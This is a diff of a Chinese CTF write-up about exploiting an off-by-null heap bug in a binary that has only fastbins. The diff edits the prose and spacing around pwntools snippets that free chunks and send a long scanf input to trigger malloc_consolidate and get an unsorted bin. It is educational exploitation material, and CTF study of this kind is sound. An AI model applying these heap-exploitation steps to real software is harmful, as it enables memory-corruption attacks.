@@ -188,7 +188,7 @@ __int64 __fastcall vul_func(_BYTE *a1, unsigned int a2)
 }
 ```
 
-当只有`fastbin`时的`off-by-null`似乎不能利用,当时比赛的时候苦恼了很久
+当只有`fastbin`时的`off-by-null`似乎不能利用
 
 ## tips
 在输入选项时, 通过`scanf`输入,当输入非常长的字符串时,即使使用`setbuf()`关闭了输入缓冲区,依然会暂时申请一个`large chunk`存储输入的字符串.  
@@ -226,7 +226,8 @@ void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
 在分配`large chunk`之前会调用`malloc_consolidate()`函数，使得`fastbin中的chunk`合并，通过这个小技巧我们可以获得`unsorted bin`.
 
 ## 利用流程
-- 首先构造好相应的堆结构 ,这里申请的堆块儿`size`小于`0x58`  ,然后释放掉
+- 首先构造好相应的堆结构 ,这里申请的堆块`size`小于`0x58`  ,然后释放掉  
+
 ```python
 add(87,0,'aaaa')
 add(87,1,'bbbb')
@@ -238,7 +239,8 @@ add(0x20,5,'dddd')
 for i in range(4):
 	remove(i)
 ```
-- 通过`scanf`触发`fastbin`合并  
+- 通过`scanf`触发`fastbin`合并   
+
 ```python
 p.sendlineafter("oice >> \n",'1'*0x500)
 ```
